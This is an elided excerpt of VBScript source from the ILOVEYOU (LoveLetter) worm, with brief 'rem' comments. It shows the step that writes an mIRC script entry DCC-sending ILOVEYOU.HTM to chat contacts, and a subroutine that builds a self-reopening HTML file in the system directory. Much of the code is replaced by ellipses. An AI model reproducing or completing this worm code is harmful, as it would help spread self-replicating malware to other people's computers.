  ...
  For Each f1 In fc
    ...
    If (eq <> folderspec) Then
      ...
      Then
        ...
        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\ILOVEYOU.HTM"
...
rem Subroutine to generate and create the HTML file for ILOVEYOU.HTM.
Sub html
  On Error Resume Next
  ...
  dta1 = "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
    ...
    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#ILOVEYOU.HTM#-#,#-#main#-#)@-@ "
    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#ILOVEYOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
  ...
  rem Create the ILOVEYOU.HTM file in the system directory.
  Set b = fso.CreateTextFile(dirsystem + "\ILOVEYOU.HTM")
  b.close

  rem Creates the HTM file from everything above.
  Set d = fso.OpenTextFile(dirsystem + "\ILOVEYOU.HTM", 2)
  d.write dt5
